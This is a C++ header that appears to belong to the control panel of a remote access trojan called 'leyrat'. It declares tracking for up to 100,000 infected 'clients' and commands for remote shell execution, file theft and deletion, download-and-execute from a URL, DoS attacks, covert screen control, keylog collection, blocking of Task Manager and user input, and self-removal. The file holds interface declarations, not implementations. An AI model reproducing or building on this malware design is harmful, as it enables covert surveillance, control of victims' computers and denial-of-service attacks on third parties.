#pragma once

#include "defines.h"
#include "time.h"

struct offlineuser
{
    int version;
    unsigned long serial;
    char language[255];
    char username[255];
    char computername[25];

};

struct onlineuser
{
    int version;
    unsigned long serial;
    char language[255];
    char username[255];
    char computername[25];
    char ip[25];
    unsigned short port;

    int row;
    void *last_pingtime;


    bool is_screensharing;

    char *is_uploading;
    char *is_downloading;

};

class leyrat
{
public:
	
    onlineuser *onlineclients[100000];
    int numonlineclients;

	~leyrat();
	leyrat();



	//client management

	
    bool IsClient(const char *computername, unsigned long diskserial);
    bool IsOnlineClient(const char *ip);
    bool IsOnlineClient(unsigned long diskserial, char*username, char*computername);

    void ClientAdd(const char *ip, unsigned short port, int version, unsigned long diskserial, const char *language, const char *username, const char *computername, const char *os);
    void ClientRemove(int index);

    onlineuser *GetClient(int index);
    onlineuser *GetClient(const char *ip);
    unsigned short GetClientPort(const char *ip);

    int GetClientPath(const char *ip, char *buffer, int buffersize);

    bool GetClientCountry(const char *computername, unsigned long diskserial, char *cbuf);
    bool GetClientUsername(const char *computername, unsigned long diskserial, char *cbuf);
    bool GetClientVersion(const char *computername, unsigned long diskserial, unsigned long* version);

    int GetOfflineUsers(offlineuser**buffer, unsigned int buffersize );


	//requests
    void Request_AckServer(const char *ip);

    void Request_RunCmd(const char *ip, const char*torun, bool getresponse=false);

    void Request_FileList(const char *ip, const char *dir);
    void Request_FileDownload(const char *ip, const char*file, const char*savelocation, bool is_update=false);
    void Request_FileDelete(const char *ip, const char*file);
    void Request_FileUpload(const char *ip, const char*file);

    void Request_Dos(const char *ip, const char *addr, const char *pkg, unsigned char pkglen, unsigned int time, short atkport, bool is_http);

    void Request_Screenshare(const char *ip, const char*line, const char*preset, int width, int height, unsigned char fps);
    void Request_ScreenshareInput(const char *ip, unsigned char numkeystrokes, unsigned char*keystrokes, unsigned int keystrokeslen);
    void Request_ScreenshareInput(const char *ip, int x, int y, int type, int data);


    void Request_HTTPDownload(const char *ip, const char*url, const char*store, bool exec, bool update);

    void Request_Suicide(const char *ip);

    void Request_InputBlock(const char*ip, bool is_mouse, bool should_block=true);
    void Request_TaskmgrBlock(const char*ip, bool should_block=true);
    void Request_TaskbarBlock(const char*ip, bool should_block=true);
    void Request_DesktopBlock(const char*ip, bool should_block=true);

    void Request_DiskTray(const char*ip, bool should_open=true);

	//callbacks

    void Callback_AckServer(const char *ip, unsigned short port, const char*type);

    void Callback_RunCmd(const char *ip, const char*rancmd, int len);

    void Callback_FileList(const char *ip, char**files, int numfiles);
    void Callback_FileDownload(const char *ip);
    void Callback_FileDelete(const char *ip);
    void Callback_FileUpload(const char *ip, char*filename);

    void Callback_Dos(const char *ip);

    void Callback_Screenshare(const char *ip, int width, int height, int realwidth, int realheight, int size, const unsigned char *data);
    void Callback_ScreenshareInput(const char *ip);

    void Callback_HTTPDownload(const char *ip);

    void Callback_Suicide(const char *ip);

    void Callback_KeyLog(const char *ip, char*keylog);

    void Callback_InputBlock(const char*ip);
    void Callback_TaskmgrBlock(const char*ip);
    void Callback_TaskbarBlock(const char*ip);
    void Callback_DestopBlock(const char*ip);

    void Callback_DiskTray(const char*ip);

    void Callback_LastPing(const char*ip);

};
